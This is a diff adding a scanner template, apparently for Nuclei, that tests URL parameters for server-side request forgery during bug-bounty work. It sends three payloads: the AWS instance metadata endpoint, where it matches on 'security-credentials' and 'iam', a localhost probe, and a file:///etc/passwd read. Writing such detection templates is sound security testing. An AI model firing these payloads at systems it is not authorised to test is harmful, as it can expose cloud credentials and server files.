@@ -1,0 +1,54 @@
+id: bug-bounty-ssrf-detection
+info:
+  name: SSRF Detection Patterns
+  author: claude-bug-bounty
+  severity: critical
+  description: Tests for SSRF in URL-accepting parameters
+  tags: ssrf,bug-bounty
+
+http:
+  # Test 1: AWS metadata endpoint (most critical SSRF target)
+  - raw:
+      - |
+        GET {{Path}}?{{param}}=http://169.254.169.254/latest/meta-data/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "iam"
+          - "security-credentials"
+        condition: or
+
+  # Test 2: Internal network scan
+  - raw:
+      - |
+        GET {{Path}}?{{param}}=http://127.0.0.1:80 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers:
+      - type: word
+        words:
+          - "<html"
+          - "<title>"
+          - "nginx"
+          - "apache"
+        condition: or
+        negative: false
+
+  # Test 3: SSRF with different schemes
+  - raw:
+      - |
+        GET {{Path}}?{{param}}=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers:
+      - type: word
+        words:
+          - "root:x:"
+          - "/bin/bash"
